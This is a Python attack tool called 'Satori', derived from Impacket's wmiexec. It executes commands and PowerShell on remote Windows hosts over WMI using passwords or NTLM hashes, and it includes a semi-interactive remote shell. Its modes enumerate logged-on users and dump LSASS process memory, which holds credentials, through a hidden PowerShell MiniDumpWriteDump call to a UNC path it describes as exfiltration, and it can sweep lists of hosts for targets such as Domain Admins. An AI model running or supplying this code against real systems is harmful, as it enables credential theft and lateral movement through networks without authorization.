#!/usr/bin/python
# Copyright (c) 2003-2014 CORE Security Technologies
#
# This software is provided under under a slightly modified version
# of the Apache Software License. See the accompanying LICENSE file
# for more information.
#
# Satori v0.1 - Executing powershell through WMI to perform various actions such as dumping LSASS memory to a UNC path, enumerating users, and more!
#
# Satori Author: pasv (themdhoward@gmail.com)
#
# Credits where credits due:
# Original Author of wmiexec example from Impacket:
#  beto (bethus@gmail.com)
# Powershell mostly derived from Chris Campbell's Powersploit!
#
# Mandatory blurb:
# "This product includes software developed by
#       CORE Security Technologies (http://www.coresecurity.com/)."



import sys
import os
import cmd
import argparse
import time
import ntpath
import csv  # todo: make MODE_ENUMUSER into csv output for grep, or JSON

from impacket import version, ntlm
from impacket.smbconnection import *
from impacket.dcerpc.v5.dcomrt import DCOMConnection
from impacket.dcerpc.v5.dcom import wmi
from impacket.dcerpc.v5.dtypes import NULL

OUTPUT_FILENAME = '__'

# Todo: add moar
MODE_ENUMUSER = 1
MODE_DUMPLSASS = 2
MODE_METERPRETER = 3
MODE_PUSHAGENT = 4

class WMIEXEC:
    def __init__(self, psh = '', username = '', password = '', domain = '', hashes = None, share = None, noOutput=False, mode = None, uncpath = None):
        self.__psh = psh
        self.__username = username
        self.__password = password
        self.__domain = domain
        self.__lmhash = ''
        self.__nthash = ''
        self.__mode = mode
        self.__share = share
        self.__uncpath = uncpath
        self.__noOutput = noOutput
        if hashes is not None:
            self.__lmhash, self.__nthash = hashes.split(':')

    def run(self, addr):
        if self.__noOutput is False:
            smbConnection = SMBConnection(addr, addr)
            smbConnection.login(self.__username, self.__password, self.__domain, self.__lmhash, self.__nthash)
            dialect = smbConnection.getDialect()
            if dialect == SMB_DIALECT:
                print("SMBv1 dialect used")
            elif dialect == SMB2_DIALECT_002:
                print("SMBv2.0 dialect used")
            elif dialect == SMB2_DIALECT_21:
                print("SMBv2.1 dialect used")
            else:
                print("SMBv3.0 dialect used")
        else:
            smbConnection = None

        dcom = DCOMConnection(addr, self.__username, self.__password, self.__domain, self.__lmhash, self.__nthash, oxidResolver = True)

        iInterface = dcom.CoCreateInstanceEx(wmi.CLSID_WbemLevel1Login,wmi.IID_IWbemLevel1Login)
        iWbemLevel1Login = wmi.IWbemLevel1Login(iInterface)
        iWbemServices= iWbemLevel1Login.NTLMLogin('//./root/cimv2', NULL, NULL)
        iWbemLevel1Login.RemRelease()

        win32Process,_ = iWbemServices.GetObject('Win32_Process')

        try:
            self.shell = RemoteShell(self.__share, win32Process, smbConnection)
            if self.__psh != ' ':
                self.shell.onecmd(self.__psh)
            elif self.__mode != None:
                if self.__mode == MODE_ENUMUSER:
                    print "Entering ENUMUSER mode"
                    # ugly, clean it up if possible and only pull relevant fields: username, type of session
                    self.__psh = "powershell -nop -wind hidden -noni \"$d = query session; 1..($d.count-1) | % { Write-Host '---';$d[$_].Substring(19,20).Trim();$d[$_].Substring(48,8).Trim();$d[$_].Substring(1,18).Trim();}\""
                elif self.__mode == MODE_DUMPLSASS:
                    print "Entering DUMPLSASS mode. Results will be saved to " + self.__uncpath
                    self.__uncpath = self.__uncpath.replace("\\", "\\\\")
                    self.__psh = "cmd.exe /c powershell -nop -wind hidden -noni \"$proc = ps lsass;$FileStream = New-Object IO.FileStream('" + self.__uncpath + "', [IO.FileMode]::Create);$Result = ((([PSObject].Assembly.GetType('System.Management.Automation.WindowsErrorReporting')).GetNestedType('NativeMethods', 'NonPublic')).GetMethod('MiniDumpWriteDump', ([Reflection.BindingFlags] 'NonPublic, Static'))).Invoke($null,@($proc.Handle,$proc.Id,$FileStream.SafeFileHandle,[UInt32] 2,[IntPtr]::Zero,[IntPtr]::Zero,[IntPtr]::Zero));exit;\""
                elif self.__mode == MODE_METERPRETER:
                    pass
                elif self.__mode == MODE_PUSHAGENT:
                    pass
                #print self.__username + ":" + self.__password + ":" + self.__domain
                # dont execute yet, validate params
                self.shell.onecmd(self.__psh)
            else:
                # this shouldn't be reached..
                print "No powershell or mode provided!"
                if smbConnection is not None:
                    smbConnection.logoff()
                dcom.disconnect()
                sys.exit(1)
                # self.shell.cmdloop() # - is it possible to interactive powershell prompt?
        except  (Exception, KeyboardInterrupt), e:
            #import traceback
            #traceback.print_exc()
            print e
            if smbConnection is not None:
                smbConnection.logoff()
            dcom.disconnect()
            sys.stdout.flush()
            sys.exit(1)

        if smbConnection is not None:
            smbConnection.logoff()
        dcom.disconnect()

class RemoteShell(cmd.Cmd):
    def __init__(self, share, win32Process, smbConnection):
        cmd.Cmd.__init__(self)
        self.__share = share
        self.__output = '\\' + OUTPUT_FILENAME 
        self.__outputBuffer = ''
        self.__shell = 'cmd.exe /Q /c '
        self.__win32Process = win32Process
        self.__transferClient = smbConnection
        self.__pwd = 'C:\\'
        self.__noOutput = False
        self.intro = '[!] Launching semi-interactive shell - Careful what you execute'

        # We don't wanna deal with timeouts from now on.
        if self.__transferClient is not None:
            self.__transferClient.setTimeout(100000)
            self.do_cd('\\')
        else:
            self.__noOutput = True

    def do_shell(self, s):
        os.system(s)

    def do_exit(self, s):
        return True

    def emptyline(self):
        return False

    def do_cd(self, s):
        self.execute_remote('cd ' + s)
        if len(self.__outputBuffer.strip('\r\n')) > 0:
            print self.__outputBuffer
            self.__outputBuffer = ''
        else:
            self.__pwd = ntpath.normpath(ntpath.join(self.__pwd, s))
            self.execute_remote('cd ')
            self.__pwd = self.__outputBuffer.strip('\r\n')
            self.prompt = self.__pwd + '>'
            self.__outputBuffer = ''

    def default(self, line):
        # Let's try to guess if the user is trying to change drive
        if len(line) == 2 and line[1] == ':':
            # Execute the command and see if the drive is valid
            self.execute_remote(line)
            if len(self.__outputBuffer.strip('\r\n')) > 0: 
                # Something went wrong
                print self.__outputBuffer
                self.__outputBuffer = ''
            else:
                # Drive valid, now we should get the current path
                self.__pwd = line
                self.execute_remote('cd ')
                self.__pwd = self.__outputBuffer.strip('\r\n')
                self.prompt = self.__pwd + '>'
                self.__outputBuffer = ''
        else:
            if line != '':
                self.send_data(line)

    def get_output(self):
        def output_callback(data):
            self.__outputBuffer += data

        if self.__noOutput is True:
            self.__outputBuffer = ''
            return

        while True:
            try:
                self.__transferClient.getFile(self.__share, self.__output, output_callback)
                break
            except Exception, e:
                if str(e).find('STATUS_SHARING_VIOLATION') >=0:
                    # Output not finished, let's wait
                    time.sleep(1)
                    pass
                else:
                    #print str(e)
                    pass 
        self.__transferClient.deleteFile(self.__share, self.__output)

    def execute_remote(self, data):
        command = self.__shell + data 
        if self.__noOutput is False:
            command += ' 1> ' + '\\\\127.0.0.1\\%s' % self.__share + self.__output  + ' 2>&1'
        obj = self.__win32Process.Create(command, self.__pwd, None)
        self.get_output()

    def send_data(self, data):
        self.execute_remote(data)
        print self.__outputBuffer
        self.__outputBuffer = ''


# Process command-line arguments.
if __name__ == '__main__':
    print version.BANNER

    parser = argparse.ArgumentParser()

    parser.add_argument('-host', action='store', help='[domain/][username[:password]@]<address>')
    parser.add_argument('-share', action='store', default = 'ADMIN$', help='share where the output will be grabbed from (default ADMIN$)')
    parser.add_argument('-nooutput', action='store_true', default = False, help='whether or not to print the output (no SMB connection created)')
    parser.add_argument('-domain', action='store', default = None, help="SMB Domain to use, leave blank for local accounts")
    parser.add_argument('-user', action = 'store', default = None, help='SMB user account to execute powershell with') 
    parser.add_argument('-password', action = 'store', default = None, help='Password for SMB user account, if omitted hash will be used')
    parser.add_argument('-hosts', action='store', default = None, help='Newline separated file of SMB hosts')
    parser.add_argument('-targetusers', action='store', default = None, help='Target users (usually Domain Admins) to conditionally dump LSASS memory to UNC path')
    parser.add_argument('-mode', action='store', default = None, help='The following modes are accepted: [1] Enumerate users\n[2] Dump lsass memory to UNC path\n[3] Powershell meterpreter. If no mode is given powershell must be provided to be excuted\n[4] Push powershell agent to monitor for a set list of users and dump lsass memory upon login')
    parser.add_argument('-uncpath', action='store', default=None, help='UNC path used for exfiltration for mode 2 and 4')
    parser.add_argument('psh', nargs='*', default = ' ', help='Powershell to execute on remote host, or file containing powershell') # todo find limit of arg size
    
    # group = parser.add_argument_group('authentication')

    parser.add_argument('-hashes', action="store", metavar = "LMHASH:NTHASH", help='NTLM hashes, format is LMHASH:NTHASH')
 
    if len(sys.argv)==1:
        parser.print_help()
        sys.exit(1)

    options = parser.parse_args()

    if ' '.join(options.psh) == ' ' and options.mode is None:
        print "ERROR: Either a mode must be specified or powershell must be provided"
        sys.exit(1)
    if os.path.exists(options.psh):
        print "[+] Using Powershell file: " + options.psh
        try:
            psh=open(options.psh).read()
        except:
            print "[-] Couldn't read from file given!"
            sys.exit(1)
    else:
        psh = ' '.join(options.psh)

    import re
    if options.hosts is None:
        #domain, username, password, address = re.compile('(?:(?:([^/@:]*)/)?([^@:]*)(?::([^@]*))?@)?(.*)').match(options.target).groups('')
        address = options.host
    else:
        addresses = []
        # we have multiple addresses
        if options.user is not None:
            try:
                fh = open(options.hosts)
                for line in fh.readlines():
                    addresses.append(line.rstrip("\n"))
                fh.close()
            except:
                print "[-] Couln't open the target list file specified"
                sys.exit(1)
        else:
            print "[-] Username required!"
            sys.exit(1)

    try:
        if options.domain is None:
            domain = ''
        if options.domain is not None:
            domain = options.domain

        if options.password is None and options.user is not None and options.hashes is None:
            from getpass import getpass
            password = getpass("Password:")
        else:
            password = options.password
        executer = WMIEXEC(psh, options.user, password, domain, options.hashes, options.share, options.nooutput, int(options.mode), options.uncpath)
        
        ## TODO: MAKE THIS MULTI-THREADED GODDAMN IT
        if options.hosts is not None:
            for host in addresses:
                try:
                    executer.run(host)
                except (Exception, KeyboardInterrupt), e:
                    pass
        else:
            executer.run(address)
    except (Exception, KeyboardInterrupt), e:
        #import traceback
        #print traceback.print_exc()
        print '\nERROR: %s' % e
    sys.exit(0)
